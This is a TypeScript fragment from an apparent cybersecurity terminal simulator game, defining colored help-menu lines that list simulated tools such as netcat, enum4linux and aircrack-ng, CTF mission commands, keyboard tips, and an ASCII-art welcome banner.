  { text: '    nc / netcat [args]         Network utility', color: 'green' },
  { text: '    enum4linux [args]          SMB enumerator', color: 'green' },
  { text: '    curl [args]                HTTP client', color: 'green' },
  { text: '    ping <target>              ICMP echo request', color: 'green' },
  { text: '    aircrack-ng [args]         WiFi cracker', color: 'green' },
  { text: '', color: 'dim' },
  { text: '  MISSIONS', color: 'yellow' },
  { text: '    mission list               List available missions', color: 'cyan' },
  { text: '    mission start <id>         Start a mission', color: 'cyan' },
  { text: '    mission abort              Abort current mission', color: 'cyan' },
  { text: '', color: 'dim' },
  { text: '  TIPS', color: 'yellow' },
  { text: '    ↑ / ↓                 Cycle command history', color: 'dim' },
  { text: '    Tab                   Auto-complete commands', color: 'dim' },
  { text: '    Ctrl+L                Clear screen', color: 'dim' },
  { text: '', color: 'dim' },
];

// ── Welcome Banner ──────────────────────────────────────────

export const welcomeBanner: OutputLine[] = [
  { text: '', color: 'dim' },
  { text: '  ███████╗██╗  ██╗███████╗██╗     ██╗     ███████╗████████╗ █████╗  ██████╗██╗  ██╗', color: 'green' },
  { text: '  ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝', color: 'green' },
  { text: '  ███████╗███████║█████╗  ██║     ██║     ███████╗   ██║   ███████║██║     █████╔╝ ', color: 'green' },
  { text: '  ╚════██║██╔══██║██╔══╝  ██║     ██║     ╚════██║   ██║   ██╔══██║██║     ██╔═██╗ ', color: 'green' },
  { text: '  ███████║██║  ██║███████╗███████╗███████╗███████║   ██║   ██║  ██║╚██████╗██║  ██╗', color: 'green' },
  { text: '  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝', color: 'green' },
  { text: '', delay: 200 },
  { text: '  ┌─────────────────────────────────────────────────────────────────────┐', color: 'dim' },
  { text: '  │  Interactive Cybersecurity Terminal Simulator v2.0                  │', color: 'cyan' },
  { text: '  │  Type "help" for available commands  •  Type "mission list" for CTF │', color: 'dim' },
  { text: '  └─────────────────────────────────────────────────────────────────────┘', color: 'dim' },
  { text: '', delay: 100 },
  { text: '  [SYS] Terminal initialized. 15 security tools loaded.', color: 'cyan' },
  { text: '  [SYS] Filesystem mounted. 6 missions available.', color: 'cyan' },
  { text: '  [SYS] Connection: SECURE • Session: ACTIVE', color: 'green' },
  { text: '', color: 'dim' },
];
